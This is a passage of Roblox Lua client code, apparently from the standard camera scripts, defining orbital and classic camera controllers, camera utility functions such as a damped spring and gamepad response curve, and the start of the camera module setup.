			self.externalProperties["ReferenceAzimuth"] 	= -45	-- Angle around the Y axis where the camera starts. -45 offsets the camera in the -X and +Z directions equally
			self.externalProperties["CWAzimuthTravel"] 	= 90	-- How many degrees the camera is allowed to rotate from the reference position, CW as seen from above
			self.externalProperties["CCWAzimuthTravel"] 	= 90	-- How many degrees the camera is allowed to rotate from the reference position, CCW as seen from above
			self.externalProperties["UseAzimuthLimits"] 	= false -- Full rotation around Y axis available by default
			self:LoadNumberValueParameters()

			return self
		end

		function OrbitalCamera:LoadOrCreateNumberValueParameter(name, valueType, updateFunction)
			local valueObj = script:FindFirstChild(name)

			if valueObj and valueObj:isA(valueType) then
				-- Value object exists and is the correct type, use its value
				self.externalProperties[name] = valueObj.Value
			elseif self.externalProperties[name] ~= nil then
				-- Create missing (or replace incorrectly-typed) valueObject with default value
				valueObj = Instance.new(valueType)
				valueObj.Name = name
				valueObj.Parent = script
				valueObj.Value = self.externalProperties[name]
			else
				print("externalProperties table has no entry for ",name)
				return
			end

			if updateFunction then
				if self.changedSignalConnections[name] then
					self.changedSignalConnections[name]:Disconnect()
				end
				self.changedSignalConnections[name] = valueObj.Changed:Connect(function(newValue)
					self.externalProperties[name] = newValue
					updateFunction(self)
				end)
			end
		end

		function OrbitalCamera:SetAndBoundsCheckAzimuthValues()
			self.minAzimuthAbsoluteRad = math.rad(self.externalProperties["ReferenceAzimuth"]) - math.abs(math.rad(self.externalProperties["CWAzimuthTravel"]))
			self.maxAzimuthAbsoluteRad = math.rad(self.externalProperties["ReferenceAzimuth"]) + math.abs(math.rad(self.externalProperties["CCWAzimuthTravel"]))
			self.useAzimuthLimits = self.externalProperties["UseAzimuthLimits"]
			if self.useAzimuthLimits then
				self.curAzimuthRad = math.max(self.curAzimuthRad, self.minAzimuthAbsoluteRad)
				self.curAzimuthRad = math.min(self.curAzimuthRad, self.maxAzimuthAbsoluteRad)
			end
		end

		function OrbitalCamera:SetAndBoundsCheckElevationValues()
			-- These degree values are the direct user input values. It is deliberate that they are
			-- ranged checked only against the extremes, and not against each other. Any time one
			-- is changed, both of the internal values in radians are recalculated. This allows for
			-- A developer to change the values in any order and for the end results to be that the
			-- internal values adjust to match intent as best as possible.
			local minElevationDeg = math.max(self.externalProperties["MinElevation"], MIN_ALLOWED_ELEVATION_DEG)
			local maxElevationDeg = math.min(self.externalProperties["MaxElevation"], MAX_ALLOWED_ELEVATION_DEG)

			-- Set internal values in radians
			self.minElevationRad = math.rad(math.min(minElevationDeg, maxElevationDeg))
			self.maxElevationRad = math.rad(math.max(minElevationDeg, maxElevationDeg))
			self.curElevationRad = math.max(self.curElevationRad, self.minElevationRad)
			self.curElevationRad = math.min(self.curElevationRad, self.maxElevationRad)
		end

		function OrbitalCamera:SetAndBoundsCheckDistanceValues()
			self.minDistance = self.externalProperties["MinDistance"]
			self.maxDistance = self.externalProperties["MaxDistance"]
			self.curDistance = math.max(self.curDistance, self.minDistance)
			self.curDistance = math.min(self.curDistance, self.maxDistance)
		end

		-- This loads from, or lazily creates, NumberValue objects for exposed parameters
		function OrbitalCamera:LoadNumberValueParameters()
			-- These initial values do not require change listeners since they are read only once
			self:LoadOrCreateNumberValueParameter("InitialElevation", "NumberValue", nil)
			self:LoadOrCreateNumberValueParameter("InitialDistance", "NumberValue", nil)

			-- Note: ReferenceAzimuth is also used as an initial value, but needs a change listener because it is used in the calculation of the limits
			self:LoadOrCreateNumberValueParameter("ReferenceAzimuth", "NumberValue", self.SetAndBoundsCheckAzimuthValue)
			self:LoadOrCreateNumberValueParameter("CWAzimuthTravel", "NumberValue", self.SetAndBoundsCheckAzimuthValues)
			self:LoadOrCreateNumberValueParameter("CCWAzimuthTravel", "NumberValue", self.SetAndBoundsCheckAzimuthValues)
			self:LoadOrCreateNumberValueParameter("MinElevation", "NumberValue", self.SetAndBoundsCheckElevationValues)
			self:LoadOrCreateNumberValueParameter("MaxElevation", "NumberValue", self.SetAndBoundsCheckElevationValues)
			self:LoadOrCreateNumberValueParameter("MinDistance", "NumberValue", self.SetAndBoundsCheckDistanceValues)
			self:LoadOrCreateNumberValueParameter("MaxDistance", "NumberValue", self.SetAndBoundsCheckDistanceValues)
			self:LoadOrCreateNumberValueParameter("UseAzimuthLimits", "BoolValue", self.SetAndBoundsCheckAzimuthValues)

			-- Internal values set (in radians, from degrees), plus sanitization
			self.curAzimuthRad = math.rad(self.externalProperties["ReferenceAzimuth"])
			self.curElevationRad = math.rad(self.externalProperties["InitialElevation"])
			self.curDistance = self.externalProperties["InitialDistance"]

			self:SetAndBoundsCheckAzimuthValues()
			self:SetAndBoundsCheckElevationValues()
			self:SetAndBoundsCheckDistanceValues()
		end

		function OrbitalCamera:GetModuleName()
			return "OrbitalCamera"
		end

		function OrbitalCamera:SetInitialOrientation(humanoid)
			if not humanoid or not humanoid.RootPart then
				warn("OrbitalCamera could not set initial orientation due to missing humanoid")
				return
			end
			local newDesiredLook = (humanoid.RootPart.CFrame.lookVector - Vector3.new(0,0.23,0)).unit
			local horizontalShift = Util.GetAngleBetweenXZVectors(newDesiredLook, self:GetCameraLookVector())
			local vertShift = math.asin(self:GetCameraLookVector().y) - math.asin(newDesiredLook.y)
			if not Util.IsFinite(horizontalShift) then
				horizontalShift = 0
			end
			if not Util.IsFinite(vertShift) then
				vertShift = 0
			end
			self.rotateInput = Vector2.new(horizontalShift, vertShift)
		end

		--[[ Functions of BaseCamera that are overridden by OrbitalCamera ]]--
		function OrbitalCamera:GetCameraToSubjectDistance()
			return self.curDistance
		end

		function OrbitalCamera:SetCameraToSubjectDistance(desiredSubjectDistance)
			print("OrbitalCamera SetCameraToSubjectDistance ",desiredSubjectDistance)
			local player = PlayersService.LocalPlayer
			if player then
				self.currentSubjectDistance = math.clamp(desiredSubjectDistance, self.minDistance, self.maxDistance)

				-- OrbitalCamera is not allowed to go into the first-person range
				self.currentSubjectDistance = math.max(self.currentSubjectDistance, self.FIRST_PERSON_DISTANCE_THRESHOLD)
			end
			self.inFirstPerson = false
			self:UpdateMouseBehavior()
			return self.currentSubjectDistance
		end

		function OrbitalCamera:CalculateNewLookVector(suppliedLookVector, xyRotateVector)
			local currLookVector = suppliedLookVector or self:GetCameraLookVector()
			local currPitchAngle = math.asin(currLookVector.y)
			local yTheta = math.clamp(xyRotateVector.y, currPitchAngle - math.rad(MAX_ALLOWED_ELEVATION_DEG), currPitchAngle - math.rad(MIN_ALLOWED_ELEVATION_DEG))
			local constrainedRotateInput = Vector2.new(xyRotateVector.x, yTheta)
			local startCFrame = CFrame.new(ZERO_VECTOR3, currLookVector)
			local newLookVector = (CFrame.Angles(0, -constrainedRotateInput.x, 0) * startCFrame * CFrame.Angles(-constrainedRotateInput.y,0,0)).lookVector
			return newLookVector
		end

		function OrbitalCamera:GetGamepadPan(name, state, input)
			if input.UserInputType == self.activeGamepad and input.KeyCode == Enum.KeyCode.Thumbstick2 then
				if self.r3ButtonDown or self.l3ButtonDown then
					-- R3 or L3 Thumbstick is depressed, right stick controls dolly in/out
					if (input.Position.Y > THUMBSTICK_DEADZONE) then
						self.gamepadDollySpeedMultiplier = 0.96
					elseif (input.Position.Y < -THUMBSTICK_DEADZONE) then
						self.gamepadDollySpeedMultiplier = 1.04
					else
						self.gamepadDollySpeedMultiplier = 1.00
					end
				else
					if state == Enum.UserInputState.Cancel then
						self.gamepadPanningCamera = ZERO_VECTOR2
						return
					end

					local inputVector = Vector2.new(input.Position.X, -input.Position.Y)
					if inputVector.magnitude > THUMBSTICK_DEADZONE then
						self.gamepadPanningCamera = Vector2.new(input.Position.X, -input.Position.Y)
					else
						self.gamepadPanningCamera = ZERO_VECTOR2
					end
				end
				return Enum.ContextActionResult.Sink
			end
			return Enum.ContextActionResult.Pass
		end

		function OrbitalCamera:DoGamepadZoom(name, state, input)
			if input.UserInputType == self.activeGamepad and (input.KeyCode == Enum.KeyCode.ButtonR3 or input.KeyCode == Enum.KeyCode.ButtonL3) then
				if (state == Enum.UserInputState.Begin) then
					self.r3ButtonDown = input.KeyCode == Enum.KeyCode.ButtonR3
					self.l3ButtonDown = input.KeyCode == Enum.KeyCode.ButtonL3
				elseif (state == Enum.UserInputState.End) then
					if (input.KeyCode == Enum.KeyCode.ButtonR3) then
						self.r3ButtonDown = false
					elseif (input.KeyCode == Enum.KeyCode.ButtonL3) then
						self.l3ButtonDown = false
					end
					if (not self.r3ButtonDown) and (not self.l3ButtonDown) then
						self.gamepadDollySpeedMultiplier = 1.00
					end
				end
				return Enum.ContextActionResult.Sink
			end
			return Enum.ContextActionResult.Pass
		end

		function OrbitalCamera:BindGamepadInputActions()
			self:BindAction("OrbitalCamGamepadPan", function(name, state, input) return self:GetGamepadPan(name, state, input) end,
			false, Enum.KeyCode.Thumbstick2)
			self:BindAction("OrbitalCamGamepadZoom", function(name, state, input) return self:DoGamepadZoom(name, state, input) end,
			false, Enum.KeyCode.ButtonR3, Enum.KeyCode.ButtonL3)
		end


		-- [[ Update ]]--
		function OrbitalCamera:Update(dt)
			local now = tick()
			local timeDelta = (now - self.lastUpdate)
			local userPanningTheCamera = (self.UserPanningTheCamera == true)
			local camera = 	workspace.CurrentCamera
			local newCameraCFrame = camera.CFrame
			local newCameraFocus = camera.Focus
			local player = PlayersService.LocalPlayer
			local cameraSubject = camera and camera.CameraSubject
			local isInVehicle = cameraSubject and cameraSubject:IsA('VehicleSeat')
			local isOnASkateboard = cameraSubject and cameraSubject:IsA('SkateboardPlatform')

			if self.lastUpdate == nil or timeDelta > 1 then
				self.lastCameraTransform = nil
			end

			if self.lastUpdate then
				local gamepadRotation = self:UpdateGamepad()

				if self:ShouldUseVRRotation() then
					self.RotateInput = self.RotateInput + self:GetVRRotationInput()
				else
					-- Cap out the delta to 0.1 so we don't get some crazy things when we re-resume from
					local delta = math.min(0.1, timeDelta)

					if gamepadRotation ~= ZERO_VECTOR2 then
						userPanningTheCamera = true
						self.rotateInput = self.rotateInput + (gamepadRotation * delta)
					end

					local angle = 0
					if not (isInVehicle or isOnASkateboard) then
						angle = angle + (self.TurningLeft and -120 or 0)
						angle = angle + (self.TurningRight and 120 or 0)
					end

					if angle ~= 0 then
						self.rotateInput = self.rotateInput +  Vector2.new(math.rad(angle * delta), 0)
						userPanningTheCamera = true
					end
				end
			end

			-- Reset tween speed if user is panning
			if userPanningTheCamera then
				self.lastUserPanCamera = tick()
			end

			local subjectPosition = self:GetSubjectPosition()

			if subjectPosition and player and camera then

				-- Process any dollying being done by gamepad
				-- TODO: Move this
				if self.gamepadDollySpeedMultiplier ~= 1 then
					self:SetCameraToSubjectDistance(self.currentSubjectDistance * self.gamepadDollySpeedMultiplier)
				end

				local VREnabled = VRService.VREnabled
				newCameraFocus = VREnabled and self:GetVRFocus(subjectPosition, timeDelta) or CFrame.new(subjectPosition)

				local cameraFocusP = newCameraFocus.p
				if VREnabled and not self:IsInFirstPerson() then
					local cameraHeight = self:GetCameraHeight()
					local vecToSubject = (subjectPosition - camera.CFrame.p)
					local distToSubject = vecToSubject.magnitude

					-- Only move the camera if it exceeded a maximum distance to the subject in VR
					if distToSubject > self.currentSubjectDistance or self.rotateInput.x ~= 0 then
						local desiredDist = math.min(distToSubject, self.currentSubjectDistance)

						-- Note that CalculateNewLookVector is overridden from BaseCamera
						vecToSubject = self:CalculateNewLookVector(vecToSubject.unit * X1_Y0_Z1, Vector2.new(self.rotateInput.x, 0)) * desiredDist

						local newPos = cameraFocusP - vecToSubject
						local desiredLookDir = camera.CFrame.lookVector
						if self.rotateInput.x ~= 0 then
							desiredLookDir = vecToSubject
						end
						local lookAt = Vector3.new(newPos.x + desiredLookDir.x, newPos.y, newPos.z + desiredLookDir.z)
						self.RotateInput = ZERO_VECTOR2

						newCameraCFrame = CFrame.new(newPos, lookAt) + Vector3.new(0, cameraHeight, 0)
					end
				else
					-- self.RotateInput is a Vector2 of mouse movement deltas since last update
					self.curAzimuthRad = self.curAzimuthRad - self.rotateInput.x

					if self.useAzimuthLimits then
						self.curAzimuthRad = math.clamp(self.curAzimuthRad, self.minAzimuthAbsoluteRad, self.maxAzimuthAbsoluteRad)
					else
						self.curAzimuthRad = (self.curAzimuthRad ~= 0) and (math.sign(self.curAzimuthRad) * (math.abs(self.curAzimuthRad) % TAU)) or 0
					end

					self.curElevationRad = math.clamp(self.curElevationRad + self.rotateInput.y, self.minElevationRad, self.maxElevationRad)

					local cameraPosVector = self.currentSubjectDistance * ( CFrame.fromEulerAnglesYXZ( -self.curElevationRad, self.curAzimuthRad, 0 ) * UNIT_Z )
					local camPos = subjectPosition + cameraPosVector

					newCameraCFrame = CFrame.new(camPos, subjectPosition)

					self.rotateInput = ZERO_VECTOR2
				end

				self.lastCameraTransform = newCameraCFrame
				self.lastCameraFocus = newCameraFocus
				if (isInVehicle or isOnASkateboard) and cameraSubject:IsA('BasePart') then
					self.lastSubjectCFrame = cameraSubject.CFrame
				else
					self.lastSubjectCFrame = nil
				end
			end

			self.lastUpdate = now
			return newCameraCFrame, newCameraFocus
		end

		return OrbitalCamera
	end

	function _ClassicCamera()

		-- Local private variables and constants
		local ZERO_VECTOR2 = Vector2.new(0,0)

		local tweenAcceleration = math.rad(220)		--Radians/Second^2
		local tweenSpeed = math.rad(0)				--Radians/Second
		local tweenMaxSpeed = math.rad(250)			--Radians/Second
		local TIME_BEFORE_AUTO_ROTATE = 2.0 		--Seconds, used when auto-aligning camera with vehicles

		local INITIAL_CAMERA_ANGLE = CFrame.fromOrientation(math.rad(-15), 0, 0)

		local FFlagUserCameraToggle do
			local success, result = pcall(function()
				return UserSettings():IsUserFeatureEnabled("UserCameraToggle")
			end)
			FFlagUserCameraToggle = success and result
		end

		--[[ Services ]]--
		local PlayersService = game:GetService('Players')
		local VRService = game:GetService("VRService")

		local CameraInput = _CameraInput()
		local Util = _CameraUtils()

		--[[ The Module ]]--
		local BaseCamera = _BaseCamera()
		local ClassicCamera = setmetatable({}, BaseCamera)
		ClassicCamera.__index = ClassicCamera

		function ClassicCamera.new()
			local self = setmetatable(BaseCamera.new(), ClassicCamera)

			self.isFollowCamera = false
			self.isCameraToggle = false
			self.lastUpdate = tick()
			self.cameraToggleSpring = Util.Spring.new(5, 0)

			return self
		end

		function ClassicCamera:GetCameraToggleOffset(dt)
			assert(FFlagUserCameraToggle)

			if self.isCameraToggle then
				local zoom = self.currentSubjectDistance

				if CameraInput.getTogglePan() then
					self.cameraToggleSpring.goal = math.clamp(Util.map(zoom, 0.5, self.FIRST_PERSON_DISTANCE_THRESHOLD, 0, 1), 0, 1)
				else
					self.cameraToggleSpring.goal = 0
				end

				local distanceOffset = math.clamp(Util.map(zoom, 0.5, 64, 0, 1), 0, 1) + 1
				return Vector3.new(0, self.cameraToggleSpring:step(dt)*distanceOffset, 0)
			end

			return Vector3.new()
		end

		-- Movement mode standardized to Enum.ComputerCameraMovementMode values
		function ClassicCamera:SetCameraMovementMode(cameraMovementMode)
			BaseCamera.SetCameraMovementMode(self, cameraMovementMode)

			self.isFollowCamera = cameraMovementMode == Enum.ComputerCameraMovementMode.Follow
			self.isCameraToggle = cameraMovementMode == Enum.ComputerCameraMovementMode.CameraToggle
		end

		function ClassicCamera:Update()
			local now = tick()
			local timeDelta = now - self.lastUpdate

			local camera = workspace.CurrentCamera
			local newCameraCFrame = camera.CFrame
			local newCameraFocus = camera.Focus

			local overrideCameraLookVector = nil
			if self.resetCameraAngle then
				local rootPart = self:GetHumanoidRootPart()
				if rootPart then
					overrideCameraLookVector = (rootPart.CFrame * INITIAL_CAMERA_ANGLE).lookVector
				else
					overrideCameraLookVector = INITIAL_CAMERA_ANGLE.lookVector
				end
				self.resetCameraAngle = false
			end

			local player = PlayersService.LocalPlayer
			local humanoid = self:GetHumanoid()
			local cameraSubject = camera.CameraSubject
			local isInVehicle = cameraSubject and cameraSubject:IsA('VehicleSeat')
			local isOnASkateboard = cameraSubject and cameraSubject:IsA('SkateboardPlatform')
			local isClimbing = humanoid and humanoid:GetState() == Enum.HumanoidStateType.Climbing

			if self.lastUpdate == nil or timeDelta > 1 then
				self.lastCameraTransform = nil
			end

			if self.lastUpdate then
				local gamepadRotation = self:UpdateGamepad()

				if self:ShouldUseVRRotation() then
					self.rotateInput = self.rotateInput + self:GetVRRotationInput()
				else
					-- Cap out the delta to 0.1 so we don't get some crazy things when we re-resume from
					local delta = math.min(0.1, timeDelta)

					if gamepadRotation ~= ZERO_VECTOR2 then
						self.rotateInput = self.rotateInput + (gamepadRotation * delta)
					end

					local angle = 0
					if not (isInVehicle or isOnASkateboard) then
						angle = angle + (self.turningLeft and -120 or 0)
						angle = angle + (self.turningRight and 120 or 0)
					end

					if angle ~= 0 then
						self.rotateInput = self.rotateInput +  Vector2.new(math.rad(angle * delta), 0)
					end
				end
			end

			local cameraHeight = self:GetCameraHeight()

			-- Reset tween speed if user is panning
			if self.userPanningTheCamera then
				tweenSpeed = 0
				self.lastUserPanCamera = tick()
			end

			local userRecentlyPannedCamera = now - self.lastUserPanCamera < TIME_BEFORE_AUTO_ROTATE
			local subjectPosition = self:GetSubjectPosition()

			if subjectPosition and player and camera then
				local zoom = self:GetCameraToSubjectDistance()
				if zoom < 0.5 then
					zoom = 0.5
				end

				if self:GetIsMouseLocked() and not self:IsInFirstPerson() then
					-- We need to use the right vector of the camera after rotation, not before
					local newLookCFrame = self:CalculateNewLookCFrame(overrideCameraLookVector)

					local offset = self:GetMouseLockOffset()
					local cameraRelativeOffset = offset.X * newLookCFrame.rightVector + offset.Y * newLookCFrame.upVector + offset.Z * newLookCFrame.lookVector

					--offset can be NAN, NAN, NAN if newLookVector has only y component
					if Util.IsFiniteVector3(cameraRelativeOffset) then
						subjectPosition = subjectPosition + cameraRelativeOffset
					end
				else
					if not self.userPanningTheCamera and self.lastCameraTransform then

						local isInFirstPerson = self:IsInFirstPerson()

						if (isInVehicle or isOnASkateboard or (self.isFollowCamera and isClimbing)) and self.lastUpdate and humanoid and humanoid.Torso then
							if isInFirstPerson then
								if self.lastSubjectCFrame and (isInVehicle or isOnASkateboard) and cameraSubject:IsA('BasePart') then
									local y = -Util.GetAngleBetweenXZVectors(self.lastSubjectCFrame.lookVector, cameraSubject.CFrame.lookVector)
									if Util.IsFinite(y) then
										self.rotateInput = self.rotateInput + Vector2.new(y, 0)
									end
									tweenSpeed = 0
								end
							elseif not userRecentlyPannedCamera then
								local forwardVector = humanoid.Torso.CFrame.lookVector
								if isOnASkateboard then
									forwardVector = cameraSubject.CFrame.lookVector
								end

								tweenSpeed = math.clamp(tweenSpeed + tweenAcceleration * timeDelta, 0, tweenMaxSpeed)

								local percent = math.clamp(tweenSpeed * timeDelta, 0, 1)
								if self:IsInFirstPerson() and not (self.isFollowCamera and self.isClimbing) then
									percent = 1
								end

								local y = Util.GetAngleBetweenXZVectors(forwardVector, self:GetCameraLookVector())
								if Util.IsFinite(y) and math.abs(y) > 0.0001 then
									self.rotateInput = self.rotateInput + Vector2.new(y * percent, 0)
								end
							end

						elseif self.isFollowCamera and (not (isInFirstPerson or userRecentlyPannedCamera) and not VRService.VREnabled) then
							-- Logic that was unique to the old FollowCamera module
							local lastVec = -(self.lastCameraTransform.p - subjectPosition)

							local y = Util.GetAngleBetweenXZVectors(lastVec, self:GetCameraLookVector())

							-- This cutoff is to decide if the humanoid's angle of movement,
							-- relative to the camera's look vector, is enough that
							-- we want the camera to be following them. The point is to provide
							-- a sizable dead zone to allow more precise forward movements.
							local thetaCutoff = 0.4

							-- Check for NaNs
							if Util.IsFinite(y) and math.abs(y) > 0.0001 and math.abs(y) > thetaCutoff * timeDelta then
								self.rotateInput = self.rotateInput + Vector2.new(y, 0)
							end
						end
					end
				end

				if not self.isFollowCamera then
					local VREnabled = VRService.VREnabled

					if VREnabled then
						newCameraFocus = self:GetVRFocus(subjectPosition, timeDelta)
					else
						newCameraFocus = CFrame.new(subjectPosition)
					end

					local cameraFocusP = newCameraFocus.p
					if VREnabled and not self:IsInFirstPerson() then
						local vecToSubject = (subjectPosition - camera.CFrame.p)
						local distToSubject = vecToSubject.magnitude

						-- Only move the camera if it exceeded a maximum distance to the subject in VR
						if distToSubject > zoom or self.rotateInput.x ~= 0 then
							local desiredDist = math.min(distToSubject, zoom)
							vecToSubject = self:CalculateNewLookVectorVR() * desiredDist
							local newPos = cameraFocusP - vecToSubject
							local desiredLookDir = camera.CFrame.lookVector
							if self.rotateInput.x ~= 0 then
								desiredLookDir = vecToSubject
							end
							local lookAt = Vector3.new(newPos.x + desiredLookDir.x, newPos.y, newPos.z + desiredLookDir.z)
							self.rotateInput = ZERO_VECTOR2

							newCameraCFrame = CFrame.new(newPos, lookAt) + Vector3.new(0, cameraHeight, 0)
						end
					else
						local newLookVector = self:CalculateNewLookVector(overrideCameraLookVector)
						self.rotateInput = ZERO_VECTOR2
						newCameraCFrame = CFrame.new(cameraFocusP - (zoom * newLookVector), cameraFocusP)
					end
				else -- is FollowCamera
					local newLookVector = self:CalculateNewLookVector(overrideCameraLookVector)
					self.rotateInput = ZERO_VECTOR2

					if VRService.VREnabled then
						newCameraFocus = self:GetVRFocus(subjectPosition, timeDelta)
					else
						newCameraFocus = CFrame.new(subjectPosition)
					end
					newCameraCFrame = CFrame.new(newCameraFocus.p - (zoom * newLookVector), newCameraFocus.p) + Vector3.new(0, cameraHeight, 0)
				end

				if FFlagUserCameraToggle then
					local toggleOffset = self:GetCameraToggleOffset(timeDelta)
					newCameraFocus = newCameraFocus + toggleOffset
					newCameraCFrame = newCameraCFrame + toggleOffset
				end

				self.lastCameraTransform = newCameraCFrame
				self.lastCameraFocus = newCameraFocus
				if (isInVehicle or isOnASkateboard) and cameraSubject:IsA('BasePart') then
					self.lastSubjectCFrame = cameraSubject.CFrame
				else
					self.lastSubjectCFrame = nil
				end
			end

			self.lastUpdate = now
			return newCameraCFrame, newCameraFocus
		end

		function ClassicCamera:EnterFirstPerson()
			self.inFirstPerson = true
			self:UpdateMouseBehavior()
		end

		function ClassicCamera:LeaveFirstPerson()
			self.inFirstPerson = false
			self:UpdateMouseBehavior()
		end

		return ClassicCamera
	end

	function _CameraUtils()

		local CameraUtils = {}

		local FFlagUserCameraToggle do
			local success, result = pcall(function()
				return UserSettings():IsUserFeatureEnabled("UserCameraToggle")
			end)
			FFlagUserCameraToggle = success and result
		end

		local function round(num)
			return math.floor(num + 0.5)
		end

		-- Critically damped spring class for fluid motion effects
		local Spring = {} do
			Spring.__index = Spring

			-- Initialize to a given undamped frequency and default position
			function Spring.new(freq, pos)
				return setmetatable({
					freq = freq,
					goal = pos,
					pos = pos,
					vel = 0,
				}, Spring)
			end

			-- Advance the spring simulation by `dt` seconds
			function Spring:step(dt)
				local f = self.freq*2*math.pi
				local g = self.goal
				local p0 = self.pos
				local v0 = self.vel

				local offset = p0 - g
				local decay = math.exp(-f*dt)

				local p1 = (offset*(1 + f*dt) + v0*dt)*decay + g
				local v1 = (v0*(1 - f*dt) - offset*(f*f*dt))*decay

				self.pos = p1
				self.vel = v1

				return p1
			end
		end

		CameraUtils.Spring = Spring

		-- map a value from one range to another
		function CameraUtils.map(x, inMin, inMax, outMin, outMax)
			return (x - inMin)*(outMax - outMin)/(inMax - inMin) + outMin
		end

		-- From TransparencyController
		function CameraUtils.Round(num, places)
			local decimalPivot = 10^places
			return math.floor(num * decimalPivot + 0.5) / decimalPivot
		end

		function CameraUtils.IsFinite(val)
			return val == val and val ~= math.huge and val ~= -math.huge
		end

		function CameraUtils.IsFiniteVector3(vec3)
			return CameraUtils.IsFinite(vec3.X) and CameraUtils.IsFinite(vec3.Y) and CameraUtils.IsFinite(vec3.Z)
		end

		-- Legacy implementation renamed
		function CameraUtils.GetAngleBetweenXZVectors(v1, v2)
			return math.atan2(v2.X*v1.Z-v2.Z*v1.X, v2.X*v1.X+v2.Z*v1.Z)
		end

		function  CameraUtils.RotateVectorByAngleAndRound(camLook, rotateAngle, roundAmount)
			if camLook.Magnitude > 0 then
				camLook = camLook.unit
				local currAngle = math.atan2(camLook.z, camLook.x)
				local newAngle = round((math.atan2(camLook.z, camLook.x) + rotateAngle) / roundAmount) * roundAmount
				return newAngle - currAngle
			end
			return 0
		end

		-- K is a tunable parameter that changes the shape of the S-curve
		-- the larger K is the more straight/linear the curve gets
		local k = 0.35
		local lowerK = 0.8
		local function SCurveTranform(t)
			t = math.clamp(t, -1, 1)
			if t >= 0 then
				return (k*t) / (k - t + 1)
			end
			return -((lowerK*-t) / (lowerK + t + 1))
		end

		local DEADZONE = 0.1
		local function toSCurveSpace(t)
			return (1 + DEADZONE) * (2*math.abs(t) - 1) - DEADZONE
		end

		local function fromSCurveSpace(t)
			return t/2 + 0.5
		end

		function CameraUtils.GamepadLinearToCurve(thumbstickPosition)
			local function onAxis(axisValue)
				local sign = 1
				if axisValue < 0 then
					sign = -1
				end
				local point = fromSCurveSpace(SCurveTranform(toSCurveSpace(math.abs(axisValue))))
				point = point * sign
				return math.clamp(point, -1, 1)
			end
			return Vector2.new(onAxis(thumbstickPosition.x), onAxis(thumbstickPosition.y))
		end

		-- This function converts 4 different, redundant enumeration types to one standard so the values can be compared
		function CameraUtils.ConvertCameraModeEnumToStandard(enumValue)
			if enumValue == Enum.TouchCameraMovementMode.Default then
				return Enum.ComputerCameraMovementMode.Follow
			end

			if enumValue == Enum.ComputerCameraMovementMode.Default then
				return Enum.ComputerCameraMovementMode.Classic
			end

			if enumValue == Enum.TouchCameraMovementMode.Classic or
				enumValue == Enum.DevTouchCameraMovementMode.Classic or
				enumValue == Enum.DevComputerCameraMovementMode.Classic or
				enumValue == Enum.ComputerCameraMovementMode.Classic then
				return Enum.ComputerCameraMovementMode.Classic
			end

			if enumValue == Enum.TouchCameraMovementMode.Follow or
				enumValue == Enum.DevTouchCameraMovementMode.Follow or
				enumValue == Enum.DevComputerCameraMovementMode.Follow or
				enumValue == Enum.ComputerCameraMovementMode.Follow then
				return Enum.ComputerCameraMovementMode.Follow
			end

			if enumValue == Enum.TouchCameraMovementMode.Orbital or
				enumValue == Enum.DevTouchCameraMovementMode.Orbital or
				enumValue == Enum.DevComputerCameraMovementMode.Orbital or
				enumValue == Enum.ComputerCameraMovementMode.Orbital then
				return Enum.ComputerCameraMovementMode.Orbital
			end

			if FFlagUserCameraToggle then
				if enumValue == Enum.ComputerCameraMovementMode.CameraToggle or
					enumValue == Enum.DevComputerCameraMovementMode.CameraToggle then
					return Enum.ComputerCameraMovementMode.CameraToggle
				end
			end

			-- Note: Only the Dev versions of the Enums have UserChoice as an option
			if enumValue == Enum.DevTouchCameraMovementMode.UserChoice or
				enumValue == Enum.DevComputerCameraMovementMode.UserChoice then
				return Enum.DevComputerCameraMovementMode.UserChoice
			end

			-- For any unmapped options return Classic camera
			return Enum.ComputerCameraMovementMode.Classic
		end

		return CameraUtils
	end

	function _CameraModule()
		local CameraModule = {}
		CameraModule.__index = CameraModule

		local FFlagUserCameraToggle do
			local success, result = pcall(function()
				return UserSettings():IsUserFeatureEnabled("UserCameraToggle")
			end)
			FFlagUserCameraToggle = success and result
		end

		local FFlagUserRemoveTheCameraApi do
			local success, result = pcall(function()
				return UserSettings():IsUserFeatureEnabled("UserRemoveTheCameraApi")
			end)
			FFlagUserRemoveTheCameraApi = success and result
		end

		-- NOTICE: Player property names do not all match their StarterPlayer equivalents,
		-- with the differences noted in the comments on the right
		local PLAYER_CAMERA_PROPERTIES =
			{
				"CameraMinZoomDistance",
				"CameraMaxZoomDistance",
				"CameraMode",
				"DevCameraOcclusionMode",
				"DevComputerCameraMode",			-- Corresponds to StarterPlayer.DevComputerCameraMovementMode
				"DevTouchCameraMode",				-- Corresponds to StarterPlayer.DevTouchCameraMovementMode

				-- Character movement mode
				"DevComputerMovementMode",
				"DevTouchMovementMode",
				"DevEnableMouseLock",				-- Corresponds to StarterPlayer.EnableMouseLockOption
			}

		local USER_GAME_SETTINGS_PROPERTIES =
			{
				"ComputerCameraMovementMode",
				"ComputerMovementMode",
				"ControlMode",
				"GamepadCameraSensitivity",
				"MouseSensitivity",
				"RotationType",
				"TouchCameraMovementMode",
				"TouchMovementMode",
			}

		--[[ Roblox Services ]]--
		local Players = game:GetService("Players")
		local RunService = game:GetService("RunService")
		local UserInputService = game:GetService("UserInputService")
		local UserGameSettings = UserSettings():GetService("UserGameSettings")

		-- Camera math utility library
		local CameraUtils = _CameraUtils()

		-- Load Roblox Camera Controller Modules
		local ClassicCamera = _ClassicCamera()
		local OrbitalCamera = _OrbitalCamera()
		local LegacyCamera = _LegacyCamera()

		-- Load Roblox Occlusion Modules
		local Invisicam = _Invisicam()
		local Poppercam = _Poppercam()

		-- Load the near-field character transparency controller and the mouse lock "shift lock" controller
		local TransparencyController = _TransparencyController()
		local MouseLockController = _MouseLockController()

		-- Table of camera controllers that have been instantiated. They are instantiated as they are used.
		local instantiatedCameraControllers = {}
		local instantiatedOcclusionModules = {}

		-- Management of which options appear on the Roblox User Settings screen
		do
			local PlayerScripts = Players.LocalPlayer:WaitForChild("PlayerScripts")

			PlayerScripts:RegisterTouchCameraMovementMode(Enum.TouchCameraMovementMode.Default)
			PlayerScripts:RegisterTouchCameraMovementMode(Enum.TouchCameraMovementMode.Follow)
			PlayerScripts:RegisterTouchCameraMovementMode(Enum.TouchCameraMovementMode.Classic)

			PlayerScripts:RegisterComputerCameraMovementMode(Enum.ComputerCameraMovementMode.Default)
			PlayerScripts:RegisterComputerCameraMovementMode(Enum.ComputerCameraMovementMode.Follow)
			PlayerScripts:RegisterComputerCameraMovementMode(Enum.ComputerCameraMovementMode.Classic)
			if FFlagUserCameraToggle then
				PlayerScripts:RegisterComputerCameraMovementMode(Enum.ComputerCameraMovementMode.CameraToggle)
			end
		end

		CameraModule.FFlagUserCameraToggle = FFlagUserCameraToggle


